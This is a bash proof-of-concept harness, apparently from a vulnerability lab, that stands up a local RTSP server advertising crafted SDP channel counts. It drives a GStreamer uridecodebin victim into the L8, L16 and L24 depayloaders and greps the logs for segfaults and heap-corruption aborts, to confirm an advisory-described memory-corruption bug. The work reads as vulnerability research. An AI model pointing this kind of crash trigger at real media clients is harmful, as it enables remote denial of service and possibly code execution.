#!/usr/bin/env bash
# Pre-auth remote reachability across the three advisory-affected depays.
# Loopback RTSP server serves a=rtpmap:96 <CODEC>/44100/N; a stock
# uridecodebin victim auto-plugs the matching rtpL*depay (no element named,
# no SDP structure-name modelling). Question: does SDP-derived encoding-params
# reach set_caps and fault the victim for L8, L16 and L24 alike?
# Run from repo root: bash lab/gst2shell-src/run_rtsp_family.sh
set -u
cd "$(dirname "$0")" || exit 1
sha256sum rtsp_server_codec.py | sed 's/^/server_codec_digest /'

port=18600
for codec in L8 L16 L24; do
  for n in 8 1000; do
    echo "=== codec=$codec channels=$n port=$port ==="
    python3 rtsp_server_codec.py "$port" "$n" "$codec" >"family_server_${codec}_${n}.log" 2>&1 &
    srvpid=$!
    sleep 0.6
    timeout 12 gst-launch-1.0 -v \
      uridecodebin uri="rtsp://127.0.0.1:${port}/" name=u \
      u. ! fakesink \
      >"family_${codec}_${n}.log" 2>&1
    rc=$?
    echo "$rc" > "family_rc_${codec}_${n}.txt"
    echo "gst-launch rc=$rc"
    kill "$srvpid" 2>/dev/null
    wait "$srvpid" 2>/dev/null
    echo "--- auto-plugged depay / caps / fault ---"
    grep -aE 'rtp[L8L124]+depay|rtpL.*depay|encoding-params|application/x-rtp|SIGSEGV|segmentation|SIGABRT|malloc\(\)|malloc_consolidate\(\)|free\(\)|realloc\(\)|corrupt|invalid chunk|dumped core|Aborted|Caught|Spinning|ERROR|WARNING|GstRtp' \
      "family_${codec}_${n}.log" | sed 's/^/    /' | head -25
    echo
    port=$((port+1))
  done
done
